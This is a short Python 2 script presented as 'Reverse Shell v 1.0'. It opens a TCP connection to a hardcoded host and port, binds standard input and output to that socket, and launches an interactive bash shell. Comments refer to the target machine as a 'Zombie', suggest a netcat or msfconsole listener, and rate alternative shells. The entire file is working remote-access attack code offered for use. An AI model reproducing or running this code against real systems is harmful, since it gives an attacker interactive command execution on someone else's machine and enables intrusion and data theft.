#!/usr/bin/python
#
# Reverse Shell v 1.0 
# Tested on LINUX
# Python 2.7.x
# It connects to Host & Port given to It
# First set a Listener to grab connection from Zombie
# Listener examples: netcat, msfconsole or other ones
# Example: nc -lvp 443
# Enjoy It :)

import socket
import os
import sys
import subprocess

#Global_Variables
rhost = '192.168.1.50' # Set here different Host to connect
rport =  443           # Set here different Port to connect

print "< Python ReverSheller V 1.0>" # Simple banner
print "[+] Connection set on",rhost,":",rport #Print connection set on IP & Port
print "[+] Running ..." #########################

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP_Socket_Variable
s.connect((rhost , rport))                            # Socket_Connection on Global_Variables
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

shell = subprocess.call(["/bin/bash", "-i"]) # Set here different Shell_Environment
                                             # Default Shell on "/bin/bash Interactive"

#       < Shell Environment Supported >
# ash
# bash "Good interactive" commonly used on Unix OS
# dash "Bad"
# ksh
# zsh  "Bad interactive"
# csh
# es
# fish
# rc   "Excellent"
# scsh "Excellent"
# wish "Excellent"
